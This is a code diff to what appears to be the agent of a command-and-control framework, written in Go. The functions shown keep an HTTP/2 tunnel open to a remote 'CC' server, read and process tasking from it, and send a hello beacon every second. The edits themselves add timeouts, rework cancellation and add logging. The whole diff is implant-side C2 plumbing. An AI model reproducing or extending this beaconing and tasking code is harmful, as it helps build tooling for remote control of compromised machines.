@@ -7,6 +7,7 @@ import (
 	"errors"
 	"io/ioutil"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"os/signal"
@@ -34,12 +35,26 @@ func CheckIn() error {
 
 // IsCCOnline check CCIndicator
 func IsCCOnline() bool {
-	resp, err := http.Get(CCIndicator)
+	t := &http.Transport{
+		Dial: (&net.Dialer{
+			Timeout:   60 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).Dial,
+		// We use ABSURDLY large keys, and should probably not.
+		TLSHandshakeTimeout: 60 * time.Second,
+	}
+	client := http.Client{
+		Transport: t,
+		Timeout:   30 * time.Second,
+	}
+	resp, err := client.Get(CCIndicator)
 	if err != nil {
+		log.Print(err)
 		return false
 	}
 	data, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
+		log.Print(err)
 		return false
 	}
 	defer resp.Body.Close()
@@ -57,15 +72,12 @@ func catchSignal(cancel context.CancelFunc) {
 }
 
 // ConnectCC connect to CC with h2conn
-func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, err error) {
+func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
 	var (
 		resp *http.Response
 	)
 	// use h2conn for duplex tunnel
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-
-	go catchSignal(cancel)
+	ctx, cancel = context.WithCancel(context.Background())
 
 	h2 := h2conn.Client{Client: HTTPClient}
 
@@ -85,26 +97,30 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, err error) {
 }
 
 // CCTun use the connection (CCConn)
-func CCTun(ctx context.Context) (err error) {
+func CCTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
 		in  = json.NewDecoder(CCConn)
 		out = json.NewEncoder(CCConn)
 		msg TunData // data being exchanged in the tunnel
 	)
+	go catchSignal(cancel)
 	defer func() {
+		cancel()
+
 		err = CCConn.Close()
 		if err != nil {
-			log.Print(err)
+			log.Print("CCTun closing: ", err)
 		}
 	}()
 
 	// check for CC server's response
 	go func() {
-		log.Println("check CC: started")
+		log.Println("check CC response: started")
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
+				log.Print(err)
 				continue
 			}
 			payload := msg.Payload
@@ -115,7 +131,7 @@ func CCTun(ctx context.Context) (err error) {
 			// process CC data
 			go processCCData(&msg)
 		}
-		log.Println("check CC: exited")
+		log.Println("check CC response: exited")
 	}()
 
 	sendHello := func(cnt int) bool {
@@ -136,6 +152,7 @@ func CCTun(ctx context.Context) (err error) {
 		}
 		return false
 	}
+
 	// send hello every second
 	for ctx.Err() == nil {
 		time.Sleep(1 * time.Second)
